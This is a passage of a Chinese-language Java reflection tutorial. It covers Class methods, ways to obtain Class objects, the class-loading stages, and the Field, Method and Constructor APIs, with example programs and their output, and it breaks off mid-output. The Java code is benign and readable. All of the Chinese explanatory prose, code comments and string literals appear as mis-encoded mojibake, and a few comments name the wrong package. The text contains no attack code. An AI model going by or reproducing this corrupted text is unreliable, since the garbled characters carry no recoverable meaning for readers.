å¯¹è±¡æ˜¯å­˜æ”¾åœ¨å †çš„ï¼Œç±»çš„å­—èŠ‚ç äºŒè¿›åˆ¶æ•°æ®ï¼Œ æ˜¯æ”¾åœ¨æ–¹æ³•åŒºçš„ï¼Œæœ‰çš„åœ°æ–¹ç§°ä¸ºç±»çš„å…ƒæ•°æ®(åŒ…æ‹¬æ–¹æ³•ä»£ç ï¼Œå˜é‡åï¼Œæ–¹æ³•åï¼Œè®¿é—®æƒé™ç­‰ç­‰) \n\n### Classç±»çš„å¸¸ç”¨æ–¹æ³•\n\n| æ–¹æ³•å                                               | åŠŸèƒ½è¯´æ˜                                                     |\n| ---------------------------------------------------- | ------------------------------------------------------------ |\n| static Class forName(String name)                    | è¿”å›æŒ‡å®šç±»ånameçš„Classå¯¹è±¡                                  |\n| object newlnstance()                                 | è°ƒç”¨ç¼ºçœæ„é€ å‡½æ•°ï¼Œè¿”å›è¯¥Classå¯¹è±¡çš„ä¸€ä¸ªå®ä¾‹                  |\n| getName()                                            | è¿”å›æ­¤Classå¯¹è±¡æ‰€è¡¨ç¤ºçš„å®ä½“(ç±»ã€æ¥å£ã€æ•°ç»„ç±»ã€åŸºæœ¬ç±»å‹ç­‰)åç§° |\n| Class [] getInterfaces()                             | è·å–å½“å‰Classå¯¹è±¡çš„æ¥å£                                      |\n| ClassLoader getClassLoader()                         | è¿”å›è¯¥ç±»çš„ç±»åŠ è½½å™¨                                           |\n| Class getSuperclass()                                | è¿”å›è¡¨ç¤ºæ­¤Classæ‰€è¡¨ç¤ºçš„å®ä½“çš„è¶…ç±»çš„Class                     |\n| Constructor[] getConstructors()                      | è¿”å›ä¸€ä¸ªåŒ…å«æŸäº›Constructorå¯¹è±¡çš„æ•°ç»„                        |\n| Field[]  getDeclaredFields()                         | è¿”å›Fieldå¯¹è±¡çš„ä¸€ä¸ªæ•°ç»„                                      |\n| Method getMethod(String name,Class...<?> paramTypes) | è¿”å›ä¸€ä¸ªMethodå¯¹è±¡ï¼Œæ­¤å¯¹è±¡çš„å½¢å‚ç±»å‹ä¸ºparamType              |\n\n```java\npackage com.jwt.reflection;\n\nimport java.lang.reflect.Field;\n\npublic class Class02 {\n    public static void main(String[] args) throws Exception {\n        String classAllPath = \"com.jwt.reflection.Car\";\n        //1 . è·å–åˆ°Car ç±»å¯¹åº”çš„Class å¯¹è±¡\n        Class<?> cls = Class.forName(classAllPath);//<?> è¡¨ç¤ºä¸ç¡®å®šçš„Java ç±»å‹\n        //2. è¾“å‡ºcls\n        System.out.println(cls); //æ˜¾ç¤ºcls å¯¹è±¡, æ˜¯å“ªä¸ªç±»çš„Class å¯¹è±¡\n        System.out.println(cls.getClass());//è¾“å‡ºcls è¿è¡Œç±»å‹java.lang.Class\n        //3. å¾—åˆ°åŒ…å\n        System.out.println(cls.getPackage().getName());//åŒ…å\n        //4. å¾—åˆ°å…¨ç±»å\n        System.out.println(cls.getName());\n        //5. é€šè¿‡cls åˆ›å»ºå¯¹è±¡å®ä¾‹\n        Car car = (Car) cls.newInstance();\n        System.out.println(car);//car.toString()\n        //6. é€šè¿‡åå°„è·å–å±æ€§brand\n        Field brand = cls.getField(\"brand\");\n        System.out.println(brand.get(car));//å®é©¬\n        //7. é€šè¿‡åå°„ç»™å±æ€§èµ‹å€¼\n        brand.set(car, \"å¥”é©°\");\n        System.out.println(brand.get(car));//å¥”é©°\n        //8. å¾—åˆ°æ‰€æœ‰çš„å±æ€§(å­—æ®µ)\n        System.out.println(\"=======æ‰€æœ‰çš„å­—æ®µå±æ€§====\");\n        Field[] fields = cls.getFields();\n        for (Field f : fields) {\n            System.out.println(f.getName());//åç§°\n        }\n    }\n\n}\n\nclass Car {\n    public String brand = \"å®é©¬\";\n    public int price = 500000;\n    public String color = \"ç™½è‰²\";\n\n    @Override\n    public String toString() {\n        return \"Car{\" +\n                \"brand='\" + brand + '\\'' +\n                \", price=\" + price +\n                \", color='\" + color + '\\'' +\n                '}';\n    }\n}\n\n/**\nclass com.jwt.reflection.Car\nclass java.lang.Class\ncom.jwt.reflection\ncom.jwt.reflection.Car\nCar{brand='å®é©¬', price=500000, color='ç™½è‰²'}\nå®é©¬\nå¥”é©°\n=======æ‰€æœ‰çš„å­—æ®µå±æ€§====\nbrand\nprice\ncolor\n**/\n```\n\n### è·å–Classç±»å¯¹è±¡\n\n1ã€Class.forName\n\nå‰æï¼šå·²çŸ¥ä¸€ä¸ªç±»çš„å…¨åç§°ï¼Œä¸”è¯¥ç±»è·¯å¾„ä¸‹ï¼Œå¯é€šè¿‡ Class ç±»çš„é™æ€æ–¹æ³• forName() è·å–ï¼Œå¯èƒ½æŠ›å‡ºClassNotFoundException å¼‚å¸¸\n\nå®ä¾‹ï¼š`Class cls1 = Class.forName(â€œjava.lang.Catâ€);`\n\nåº”ç”¨åœºæ™¯ï¼šå¤šç”¨äºé…ç½®æ–‡ä»¶ï¼Œè¯»å–ç±»å…¨è·¯å¾„ï¼ŒåŠ è½½ç±»\n\n2ã€ç±»å.class\n\nå‰æï¼šè‹¥å·²çŸ¥å…·ä½“çš„ç±»ï¼Œé€šè¿‡ç±»çš„ class è·å–ï¼Œè¯¥æ–¹å¼æœ€ä¸ºå®‰å…¨å¯é ï¼Œç¨‹åºæ€§èƒ½æœ€é«˜\n\nå®ä¾‹ï¼š`Class cls2 = Car.class;`\n\nåº”ç”¨åœºæ™¯ï¼šå¤šç”¨äºå‚æ•°ä¼ é€’ï¼Œæ¯”å¦‚é€šè¿‡åå°„å¾—åˆ°å¯¹åº”æ„é€ å™¨å¯¹è±¡\n\n3ã€å¯¹è±¡.getClass()\n\nå‰æï¼šå·²çŸ¥æŸä¸ªç±»çš„å®ä¾‹ï¼Œè°ƒç”¨è¯¥å®ä¾‹çš„ getClass() æ–¹æ³•è·å– Class å¯¹è±¡\n\nå®ä¾‹ï¼š`Class cls3 = å¯¹è±¡.getClass();//è¿è¡Œç±»å‹`\n\nåº”ç”¨åœºæ™¯ï¼šé€šè¿‡åˆ›å»ºå¥½çš„å¯¹è±¡ï¼Œè·å– Class å¯¹è±¡\n\n4ã€é€šè¿‡ç±»åŠ è½½å™¨\n\n`ClassLoader classLoader = å¯¹è±¡.getClass().getClassLoader();`\n\n`Class cls4  = classLoader.loadClass(â€œç±»çš„å…¨ç±»åâ€)ï¼›`\n\n5ã€åŸºæœ¬æ•°æ®ï¼ˆint,char,boolean,float,double,byte,long,shortï¼‰æŒ‰å¦‚ä¸‹æ–¹å¼å¾—åˆ°Classç±»å¯¹è±¡\n\n`Class cls5 = åŸºæœ¬æ•°æ®ç±»å‹.class`\n\n6ã€åŸºæœ¬æ•°æ®ç±»å‹å¯¹åº”çš„åŒ…è£…ç±»ï¼Œå¯ä»¥é€šè¿‡ .TYPE å¾—åˆ° Class ç±»å¯¹è±¡\n\n`Class cls6 = åŒ…è£…ç±».TYPE`\n\n```java\npackage com.jwt.reflection;\n\npublic class GetClass_ {\n    public static void main(String[] args) throws ClassNotFoundException {\n        //1. Class.forName\n        String classAllPath = \"com.jwt.reflection.Car\"; //é€šè¿‡è¯»å–é…ç½®æ–‡ä»¶è·å–\n        Class<?> cls1 = Class.forName(classAllPath);\n        System.out.println(cls1);\n        //2. ç±»å.class , åº”ç”¨åœºæ™¯: ç”¨äºå‚æ•°ä¼ é€’\n        Class cls2 = Car.class;\n        System.out.println(cls2);\n        //3. å¯¹è±¡.getClass(), åº”ç”¨åœºæ™¯ï¼Œæœ‰å¯¹è±¡å®ä¾‹\n        Car car = new Car();\n        Class cls3 = car.getClass();\n        System.out.println(cls3);\n        //4. é€šè¿‡ç±»åŠ è½½å™¨ã€4 ç§ã€‘æ¥è·å–åˆ°ç±»çš„Class å¯¹è±¡\n        //(1)å…ˆå¾—åˆ°ç±»åŠ è½½å™¨car\n        ClassLoader classLoader = car.getClass().getClassLoader();\n        //(2)é€šè¿‡ç±»åŠ è½½å™¨å¾—åˆ°Class å¯¹è±¡\n        Class cls4 = classLoader.loadClass(classAllPath);\n        System.out.println(cls4);\n        //5. åŸºæœ¬æ•°æ®(int, char,boolean,float,double,byte,long,short) æŒ‰å¦‚ä¸‹æ–¹å¼å¾—åˆ°Class ç±»å¯¹è±¡\n        Class<Integer> cls5 = int.class;\n        System.out.println(cls5);//int\n        //6. åŸºæœ¬æ•°æ®ç±»å‹å¯¹åº”çš„åŒ…è£…ç±»ï¼Œå¯ä»¥é€šè¿‡.TYPE å¾—åˆ°Class ç±»å¯¹è±¡\n        Class<Integer> cls6 = Integer.TYPE;\n        System.out.println(cls6);\n    }\n}\n/**\nclass com.jwt.reflection.Car\nclass com.jwt.reflection.Car\nclass com.jwt.reflection.Car\nclass com.jwt.reflection.Car\nint\nint\n**/\n```\n\n### å“ªäº›ç±»å‹æœ‰Classå¯¹è±¡\n\n1. å¤–éƒ¨ç±»ï¼Œæˆå‘˜å†…éƒ¨ç±»ï¼Œé™æ€å†…éƒ¨ç±»ï¼Œå±€éƒ¨å†…éƒ¨ç±»ï¼ŒåŒ¿åå†…éƒ¨ç±»\n2. interfaceï¼šæ¥å£\n3. æ•°ç»„\n4. enumï¼šæšä¸¾\n5. annotationï¼šæ³¨è§£\n6. åŸºæœ¬æ•°æ®ç±»å‹\n7. void\n\n```java\npackage com.jwt.reflection;\n\nimport java.io.Serializable;\n\npublic class AllTypeClass {\n    public static void main(String[] args) {\n        Class<String> aClass1 = String.class;//å¤–éƒ¨ç±»\n        Class<Serializable> aClass2 = Serializable.class;//æ¥å£\n        Class<Integer[]> aClass3 = Integer[].class;//æ•°ç»„\n        Class<Integer[][]> aClass4 = Integer[][].class;//äºŒç»´æ•°ç»„\n        Class<Deprecated> aClass5 = Deprecated.class;//æ³¨è§£\n        Class<Thread.State> aClass6 = Thread.State.class;//æšä¸¾\n        Class<Long> aClass7 = long.class;//åŸºæœ¬æ•°æ®ç±»å‹\n        Class<Void> aClass8 = void.class;//voidæ•°æ®ç±»å‹\n        Class<Class> aClass9 = Class.class;//Classç±»\n\n        System.out.println(aClass1);\n        System.out.println(aClass2);\n        System.out.println(aClass3);\n        System.out.println(aClass4);\n        System.out.println(aClass5);\n        System.out.println(aClass6);\n        System.out.println(aClass7);\n        System.out.println(aClass8);\n        System.out.println(aClass9);\n    }\n}\n```\n\n## ç±»åŠ è½½\n\n### é™æ€åŠ è½½å’ŒåŠ¨æ€åŠ è½½\n\nåå°„æœºåˆ¶æ˜¯ Java å®ç°åŠ¨æ€è¯­è¨€çš„å…³é”®ï¼Œä¹Ÿå°±æ˜¯é€šè¿‡åå°„å®ç°ç±»åŠ¨æ€åŠ è½½\n\n- é™æ€åŠ è½½ï¼šç¼–è¯‘æ—¶åŠ è½½ç›¸å…³çš„ç±»ï¼Œå¦‚æœæ²¡æœ‰åˆ™æŠ¥é”™\n\n```java\nDog dog = new Dog();\n```\n\n- åŠ¨æ€åŠ è½½ï¼šè¿è¡Œæ—¶åŠ è½½éœ€è¦çš„ç±»ï¼Œç¼–è¯‘ä¸æŠ¥é”™ï¼Œé™ä½äº†ä¾èµ–æ€§\n\n```java\nClass cls = Class.forName(\"Person\");\nObject o = cls.newInstance();\nMethod method = cls.getMethod(\"hi\");\nmethod.invoke(o);\n```\n\n### ç±»åŠ è½½æ—¶æœº\n\n- å½“åˆ›å»ºå¯¹è±¡æ—¶ï¼ˆnewï¼‰ //é™æ€åŠ è½½\n- å½“å­ç±»è¢«åŠ è½½æ—¶ï¼Œçˆ¶ç±»ä¹ŸåŠ è½½ //é™æ€åŠ è½½\n- è°ƒç”¨ç±»ä¸­çš„é™æ€æˆå‘˜æ—¶ //é™æ€åŠ è½½\n- é€šè¿‡åå°„ //åŠ¨æ€åŠ è½½\n\n### ç±»åŠ è½½è¿‡ç¨‹å›¾\n\n![](/Users/jianjian/jwt1399.github.io/source/images/Java-åå°„/image-20220409132757541.png)\n\n![ç±»åŠ è½½å„é˜¶æ®µå®Œæˆä»»åŠ¡](/Users/jianjian/jwt1399.github.io/source/images/Java-åå°„/image-20220409132819260.png)\n\n### ç±»åŠ è½½äº”ä¸ªé˜¶æ®µ\n\n#### 1ã€åŠ è½½é˜¶æ®µ\n\nJVMåœ¨æ”¹é˜¶æ®µçš„ä¸»è¦ç›®çš„æ˜¯å°†å­—èŠ‚ç ä»ä¸åŒçš„æ•°æ®æºï¼ˆå¯èƒ½æ˜¯ class æ–‡ä»¶ã€ä¹Ÿå¯èƒ½æ˜¯ jar åŒ…ï¼Œç”šè‡³ç½‘ç»œï¼‰è½¬åŒ–ä¸ºäºŒè¿›åˆ¶å­—èŠ‚æµåŠ è½½åˆ°å†…å­˜ä¸­ï¼Œå¹¶ç”Ÿæˆä¸€ä¸ªä»£è¡¨è¯¥ç±»çš„ java.lang.Class å¯¹è±¡\n\n#### 2ã€è¿æ¥é˜¶æ®µâ€”â€”éªŒè¯\n\n- ç›®çš„æ˜¯ä¸ºäº†ç¡®ä¿ Class æ–‡ä»¶çš„å­—èŠ‚æµä¸­åŒ…å«çš„ä¿¡æ¯ç¬¦åˆå½“å‰è™šæ‹Ÿæœºçš„è¦æ±‚ï¼Œå¹¶ä¸”ä¸ä¼šå±å®³è™šæ‹Ÿæœºè‡ªèº«çš„å®‰å…¨ã€‚\n- åŒ…æ‹¬ï¼šæ–‡ä»¶æ ¼å¼éªŒè¯ï¼ˆæ˜¯å¦ä»¥é­”æ•° oxcafebabeå¼€å¤´ï¼‰ã€å…ƒæ•°æ®éªŒè¯ã€å­—èŠ‚ç éªŒè¯å’Œç¬¦å·å¼•ç”¨éªŒè¯ã€‚\n- å¯ä»¥è€ƒè™‘ä½¿ç”¨ -Xverify:none å‚æ•°æ¥å…³é—­å¤§éƒ¨åˆ†çš„ç±»éªŒè¯æªæ–½ï¼Œç¼©çŸ­è™šæ‹Ÿæœºç±»åŠ è½½çš„æ—¶é—´ã€‚\n\n#### 3ã€è¿æ¥é˜¶æ®µâ€”â€”å‡†å¤‡\n\nJVM ä¼šåœ¨è¯¥é˜¶æ®µå¯¹**é™æ€å˜é‡**ï¼Œåˆ†é…å†…å®¹å¹¶åˆå§‹åŒ–ï¼ˆå¯¹åº”æ•°æ®ç±»å‹çš„é»˜è®¤åˆå§‹å€¼ï¼Œå¦‚0ã€0Lã€nullã€falseç­‰ï¼‰ã€‚è¿™äº›å˜é‡æ‰€ä½¿ç”¨çš„å†…å­˜éƒ½å°†åœ¨æ–¹æ³•åŒºä¸­è¿›è¡Œåˆ†é…\n\n```java\nclass A {\n//åˆ†æç±»åŠ è½½çš„é“¾æ¥é˜¶æ®µ-å‡†å¤‡å±æ€§æ˜¯å¦‚ä½•å¤„ç†\n//1. n1 æ˜¯å®ä¾‹å±æ€§, ä¸æ˜¯é™æ€å˜é‡ï¼Œå› æ­¤åœ¨å‡†å¤‡é˜¶æ®µï¼Œæ˜¯ä¸ä¼šåˆ†é…å†…å­˜\n//2. n2 æ˜¯é™æ€å˜é‡ï¼Œåˆ†é…å†…å­˜n2 é»˜è®¤åˆå§‹åŒ–0 ,è€Œä¸æ˜¯20\n//3. n3 æ˜¯static final æ˜¯å¸¸é‡, ä»–å’Œé™æ€å˜é‡ä¸ä¸€æ ·, å› ä¸ºä¸€æ—¦èµ‹å€¼å°±ä¸å˜n3 = 30\npublic int n1 = 10;\npublic static int n2 = 20;\npublic static final int n3 = 30;\n}\n```\n\n#### 4ã€è¿æ¥é˜¶æ®µâ€”â€”è§£æ\n\nè™šæ‹Ÿæœºå°†å¸¸é‡æ± å†…çš„**ç¬¦å·å¼•ç”¨**æ›¿æ¢ä¸º**ç›´æ¥å¼•ç”¨**çš„è¿‡ç¨‹ã€‚\n\n#### 5ã€åˆå§‹åŒ–é˜¶æ®µ\n\nåˆ°åˆå§‹åŒ–é˜¶æ®µï¼Œæ‰çœŸæ­£å¼€å§‹æ‰§è¡Œç±»ä¸­å®šä¹‰çš„ Java ç¨‹åºä»£ç ï¼Œæ­¤é˜¶æ®µæ˜¯æ‰§è¡Œ\\<clinit>()æ–¹æ³•çš„è¿‡ç¨‹\n\n- \\<clinit>() æ–¹æ³•æ˜¯ç”±ç¼–è¯‘å™¨æŒ‰è¯­å¥åœ¨æºæ–‡ä»¶ä¸­å‡ºç°çš„é¡ºåºï¼Œä¾æ¬¡è‡ªåŠ¨æ”¶é›†ç±»ä¸­çš„æ‰€æœ‰é™æ€å˜é‡çš„èµ‹å€¼åŠ¨ä½œå’Œé™æ€ä»£ç å—ä¸­çš„è¯­å¥ï¼Œå¹¶è¿›è¡Œåˆå¹¶ã€‚\n- è™šæ‹Ÿæœºä¼šä¿è¯ä¸€ä¸ªç±»çš„ \\<clinit>() æ–¹æ³•åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸­è¢«æ­£ç¡®çš„åŠ é”ã€åŒæ­¥ï¼Œå¦‚æœå¤šä¸ªçº¿ç¨‹åŒæ—¶å»åˆå§‹åŒ–ä¸€ä¸ªç±»ï¼Œé‚£ä¹ˆåªä¼šæœ‰ä¸€ä¸ªçº¿ç¨‹å»æ‰§è¡Œè¿™ä¸ªç±»çš„ \\<clinit>() æ–¹æ³•ï¼Œå…¶ä»–çº¿ç¨‹éƒ½éœ€è¦é˜»å¡ç­‰å¾…ï¼Œç›´åˆ°æ´»åŠ¨çº¿ç¨‹æ‰§è¡Œ \\<clinit>() æ–¹æ³•å®Œæ¯•\n\n## åå°„è·å–ç±»çš„ç»“æ„ä¿¡æ¯\n\n### 1ã€java.lang.Classç±»\n\n- getNameï¼šè·å–å…¨ç±»å\n- getSimpleNameï¼šè·å–ç®€å•ç±»å\n- getFieldsï¼šè·å–æ‰€æœ‰publicä¿®é¥°çš„å±æ€§ï¼ŒåŒ…å«æœ¬ç±»ä»¥åŠçˆ¶ç±»çš„\n- getDeclaredFieldsï¼šè·å–æœ¬ç±»ä¸­æ‰€æœ‰å±æ€§\n- getMethodsï¼šè·å–æ‰€æœ‰publicä¿®é¥°çš„æ–¹æ³•ï¼ŒåŒ…å«æœ¬ç±»ä»¥åŠçˆ¶ç±»çš„\n- getDeclaredMethodsï¼šè·å–æœ¬ç±»ä¸­æ‰€æœ‰æ–¹æ³•\n- getConstructorsï¼šè·å–æ‰€æœ‰publicä¿®é¥°çš„æ„é€ å™¨ï¼ŒåŒ…å«æœ¬ç±»ä»¥åŠçˆ¶ç±»çš„\n- getDeclaredConstructorsï¼šè·å–æœ¬ç±»ä¸­æ‰€æœ‰æ„é€ å™¨\n- getPackageï¼šä»¥Packageå½¢å¼è¿”å›çˆ¶ç±»ä¿¡æ¯\n- getSuperClassï¼šä»¥Classå½¢å¼è¿”å›çˆ¶ç±»ä¿¡æ¯\n- getInterfacesï¼šä»¥Class[]å½¢å¼è¿”å›æ¥å£ä¿¡æ¯\n- getAnnotationsï¼šä»¥Annotation[]å½¢å¼è¿”å›æ³¨è§£ä¿¡æ¯\n\n```java\n@Test\npublic void api_01() throws ClassNotFoundException, NoSuchMethodException {\n    //å¾—åˆ°Class å¯¹è±¡\n    Class<?> personCls = Class.forName(\"com.jwt.reflection.Person\");\n\n    //getName:è·å–å…¨ç±»å\n    System.out.println(personCls.getName());//com.hspedu.reflection.Person\n    //getSimpleName:è·å–ç®€å•ç±»å\n    System.out.println(personCls.getSimpleName());//Person\n    //getFields:è·å–æ‰€æœ‰public ä¿®é¥°çš„å±æ€§ï¼ŒåŒ…å«æœ¬ç±»ä»¥åŠçˆ¶ç±»çš„\n    Field[] fields = personCls.getFields();\n    for (Field field : fields) {//å¢å¼ºfor\n      System.out.println(\"æœ¬ç±»ä»¥åŠçˆ¶ç±»çš„å±æ€§=\" + field.getName());\n    }\n    System.out.println(\"==========================\");\n    //getDeclaredFields:è·å–æœ¬ç±»ä¸­æ‰€æœ‰å±æ€§\n    Field[] declaredFields = personCls.getDeclaredFields();\n    for (Field declaredField : declaredFields) {\n      System.out.println(\"æœ¬ç±»ä¸­æ‰€æœ‰å±æ€§=\" + declaredField.getName());\n    }\n    System.out.println(\"==========================\");\n    //getMethods:è·å–æ‰€æœ‰public ä¿®é¥°çš„æ–¹æ³•ï¼ŒåŒ…å«æœ¬ç±»ä»¥åŠçˆ¶ç±»çš„\n    Method[] methods = personCls.getMethods();\n    for (Method method : methods) {\n      System.out.println(\"æœ¬ç±»ä»¥åŠçˆ¶ç±»çš„æ–¹æ³•=\" + method.getName());\n    }\n    System.out.println(\"==========================\");\n    //getDeclaredMethods:è·å–æœ¬ç±»ä¸­æ‰€æœ‰æ–¹æ³•\n    Method[] declaredMethods = personCls.getDeclaredMethods();\n    for (Method declaredMethod : declaredMethods) {\n      System.out.println(\"æœ¬ç±»ä¸­æ‰€æœ‰æ–¹æ³•=\" + declaredMethod.getName());\n    }\n    System.out.println(\"==========================\");\n    //getConstructors: è·å–æ‰€æœ‰public ä¿®é¥°çš„æ„é€ å™¨ï¼ŒåŒ…å«æœ¬ç±»\n    Constructor<?>[] constructors = personCls.getConstructors();\n    for (Constructor<?> constructor : constructors) {\n      System.out.println(\"æœ¬ç±»çš„æ„é€ å™¨=\" + constructor.getName());\n    }\n    System.out.println(\"==========================\");\n    //getDeclaredConstructors:è·å–æœ¬ç±»ä¸­æ‰€æœ‰æ„é€ å™¨\n    Constructor<?>[] declaredConstructors = personCls.getDeclaredConstructors();\n    for (Constructor<?> declaredConstructor : declaredConstructors) {\n      System.out.println(\"æœ¬ç±»ä¸­æ‰€æœ‰æ„é€ å™¨=\" + declaredConstructor.getName());//è¿™é‡Œè€å¸ˆåªæ˜¯è¾“å‡ºå\n    }\n    System.out.println(\"==========================\");\n    //getPackage:ä»¥Package å½¢å¼è¿”å›åŒ…ä¿¡æ¯\n    System.out.println(personCls.getPackage());//com.hspedu.reflection\n    //getSuperClass:ä»¥Class å½¢å¼è¿”å›çˆ¶ç±»ä¿¡æ¯\n    Class<?> superclass = personCls.getSuperclass();\n    System.out.println(\"çˆ¶ç±»çš„class å¯¹è±¡=\" + superclass);\n    System.out.println(\"==========================\");\n    //getInterfaces:ä»¥Class[]å½¢å¼è¿”å›æ¥å£ä¿¡æ¯\n    Class<?>[] interfaces = personCls.getInterfaces();\n    for (Class<?> anInterface : interfaces) {\n      System.out.println(\"æ¥å£ä¿¡æ¯=\" + anInterface);\n    }\n    System.out.println(\"==========================\");\n    //getAnnotations:ä»¥Annotation[] å½¢å¼è¿”å›æ³¨è§£ä¿¡æ¯\n    Annotation[] annotations = personCls.getAnnotations();\n    for (Annotation annotation : annotations) {\n      System.out.println(\"æ³¨è§£ä¿¡æ¯=\" + annotation);//æ³¨è§£\n    }\n}\n/**\ncom.jwt.reflection.Person\nPerson\næœ¬ç±»ä»¥åŠçˆ¶ç±»çš„å±æ€§=name\næœ¬ç±»ä»¥åŠçˆ¶ç±»çš„å±æ€§=hobby\n==========================\næœ¬ç±»ä¸­æ‰€æœ‰å±æ€§=name\næœ¬ç±»ä¸­æ‰€æœ‰å±æ€§=age\næœ¬ç±»ä¸­æ‰€æœ‰å±æ€§=job\næœ¬ç±»ä¸­æ‰€æœ‰å±æ€§=sal\n==========================\næœ¬ç±»ä»¥åŠçˆ¶ç±»çš„æ–¹æ³•=m1\næœ¬ç±»ä»¥åŠçˆ¶ç±»çš„æ–¹æ³•=hi\næœ¬ç±»ä»¥åŠçˆ¶ç±»çš„æ–¹æ³•=wait\næœ¬ç±»ä»¥åŠçˆ¶ç±»çš„æ–¹æ³•=wait\næœ¬ç±»ä»¥åŠçˆ¶ç±»çš„æ–¹æ³•=wait\næœ¬ç±»ä»¥åŠçˆ¶ç±»çš„æ–¹æ³•=equals\næœ¬ç±»ä»¥åŠçˆ¶ç±»çš„æ–¹æ³•=toString\næœ¬ç±»ä»¥åŠçˆ¶ç±»çš„æ–¹æ³•=hashCode\næœ¬ç±»ä»¥åŠçˆ¶ç±»çš„æ–¹æ³•=getClass\næœ¬ç±»ä»¥åŠçˆ¶ç±»çš„æ–¹æ³•=notify\næœ¬ç±»ä»¥åŠçˆ¶ç±»çš„æ–¹æ³•=notifyAll\n==========================\næœ¬ç±»ä¸­æ‰€æœ‰æ–¹æ³•=m1\næœ¬ç±»ä¸­æ‰€æœ‰æ–¹æ³•=m2\næœ¬ç±»ä¸­æ‰€æœ‰æ–¹æ³•=m4\næœ¬ç±»ä¸­æ‰€æœ‰æ–¹æ³•=m3\n==========================\næœ¬ç±»çš„æ„é€ å™¨=com.jwt.reflection.Person\næœ¬ç±»çš„æ„é€ å™¨=com.jwt.reflection.Person\n==========================\næœ¬ç±»ä¸­æ‰€æœ‰æ„é€ å™¨=com.jwt.reflection.Person\næœ¬ç±»ä¸­æ‰€æœ‰æ„é€ å™¨=com.jwt.reflection.Person\næœ¬ç±»ä¸­æ‰€æœ‰æ„é€ å™¨=com.jwt.reflection.Person\n==========================\npackage com.jwt.reflection\nçˆ¶ç±»çš„class å¯¹è±¡=class com.jwt.reflection.A\n==========================\næ¥å£ä¿¡æ¯=interface com.jwt.reflection.IA\næ¥å£ä¿¡æ¯=interface com.jwt.reflection.IB\n==========================\n**/\n```\n\næµ‹è¯•ä»£ç \n\n```java\nclass A {\n    public String hobby;\n    public void hi() {}\n    public A() {}\n    public A(String name) {}\n}\n\n\ninterface IA { }\n\ninterface IB { }\n\n@Deprecated\nclass Person extends A implements IA, IB {\n    //å±æ€§\n    public String name;\n    protected static int age; // 4 + 8 = 12\n    String job;\n    private double sal;\n    //æ„é€ å™¨\n    public Person() {}\n    public Person(String name) {}\n    //ç§æœ‰çš„\n    private Person(String name, int age) {}\n    //æ–¹æ³•\n    public void m1(String name, int age, double sal) {}\n    protected String m2() {\n        return null;\n    }\n    void m3() {}\n    private void m4() {}\n}\n```\n\n### 2ã€java.lang.reflect.Fieldç±»\n\n- getModifiersï¼šä»¥intå½¢å¼è¿”å›ä¿®é¥°ç¬¦\n  - è¯´æ˜ï¼šé»˜è®¤ä¿®é¥°ç¬¦æ˜¯0ï¼Œpublicæ˜¯1ï¼Œprivateæ˜¯2ï¼Œprotectedæ˜¯4ï¼Œstaticæ˜¯8ï¼Œfinalæ˜¯16\n- getTypeï¼šä»¥Classå½¢å¼è¿”å›ç±»å‹\n- getNameï¼šè¿”å›å±æ€§å\n\n### 3ã€java.lang.reflect.Mehodç±»\n\n- getModifiersï¼šä»¥intå½¢å¼è¿”å›ä¿®é¥°ç¬¦\n  - è¯´æ˜ï¼šé»˜è®¤ä¿®é¥°ç¬¦æ˜¯0ï¼Œpublicæ˜¯1ï¼Œprivateæ˜¯2ï¼Œprotectedæ˜¯4ï¼Œstaticæ˜¯8ï¼Œfinalæ˜¯16\n- getReturnTypeï¼šä»¥Classå½¢å¼è·å–è¿”å›ç±»å‹\n- getNameï¼šè¿”å›æ–¹æ³•å\n- getParameterTypesï¼šä»¥Class[]è¿”å›å‚æ•°ç±»å‹æ•°ç»„\n\n### 4ã€java.lang.reflect.Constructorç±»\n\n- getModifiersï¼šä»¥intå½¢å¼è¿”å›ä¿®é¥°ç¬¦\n- getNameï¼šè¿”å›æ„é€ å™¨åï¼ˆå…¨ç±»åï¼‰\n- getParameterTypesï¼šä»¥Class[]è¿”å›å‚æ•°ç±»å‹æ•°ç»„\n\n```java\n@Test\npublic void api_02() throws ClassNotFoundException, NoSuchMethodException {\n  //å¾—åˆ°Class å¯¹è±¡\n  Class<?> personCls = Class.forName(\"com.jwt.reflection.Person\");\n  \n  //java.lang.reflect.Field\n  //è§„å®šè¯´æ˜: é»˜è®¤ä¿®é¥°ç¬¦æ˜¯0 ï¼Œ public æ˜¯1 ï¼Œprivate æ˜¯2 ï¼Œprotected æ˜¯4 , static æ˜¯8 ï¼Œfinal æ˜¯16\n  Field[] declaredFields = personCls.getDeclaredFields();\n  for (Field declaredField : declaredFields) {\n    System.out.println(\"æœ¬ç±»ä¸­æ‰€æœ‰å±æ€§=\" + declaredField.getName()\n                       + \" è¯¥å±æ€§çš„ä¿®é¥°ç¬¦å€¼=\" + declaredField.getModifiers()\n                       + \" è¯¥å±æ€§çš„ç±»å‹=\" + declaredField.getType()\n                      );\n  }\n  System.out.println(\"==========================\");\n\n  //java.lang.reflect.Mehod\n  Method[] declaredMethods = personCls.getDeclaredMethods();\n  for (Method declaredMethod : declaredMethods) {\n    System.out.println(\"æœ¬ç±»ä¸­æ‰€æœ‰æ–¹æ³•=\" + declaredMethod.getName()\n                       + \" è¯¥æ–¹æ³•çš„è®¿é—®ä¿®é¥°ç¬¦å€¼=\" + declaredMethod.getModifiers()\n                       + \" è¯¥æ–¹æ³•è¿”å›ç±»å‹\" + declaredMethod.getReturnType()\n                      );\n  }\n  for (Method declaredMethod : declaredMethods) {\n    //è¾“å‡ºå½“å‰è¿™ä¸ªæ–¹æ³•çš„å½¢å‚æ•°ç»„æƒ…å†µ\n    Class<?>[] parameterTypes = declaredMethod.getParameterTypes();\n    for (Class<?> parameterType : parameterTypes) {\n      System.out.println(\"è¯¥æ–¹æ³•çš„å½¢å‚ç±»å‹=\" + parameterType);\n    }\n  }\n  System.out.println(\"==========================\");\n\n\n  //java.lang.reflect.Constructor\n  Constructor<?>[] declaredConstructors = personCls.getDeclaredConstructors();\n  for (Constructor<?> declaredConstructor : declaredConstructors) {\n    System.out.println(\"æœ¬ç±»ä¸­æ‰€æœ‰æ„é€ å™¨=\" + declaredConstructor.getName());//åªæ˜¯è¾“å‡ºå\n\n  }\n  for (Constructor<?> declaredConstructor : declaredConstructors) {\n    Class<?>[] parameterTypes = declaredConstructor.getParameterTypes();\n    for (Class<?> parameterType : parameterTypes) {\n      System.out.println(\"è¯¥æ„é€ å™¨çš„å½¢å‚ç±»å‹=\" + parameterType);\n    }\n  }\n}\n/**\næœ¬ç±»ä¸­æ‰€æœ‰å±æ€§=name 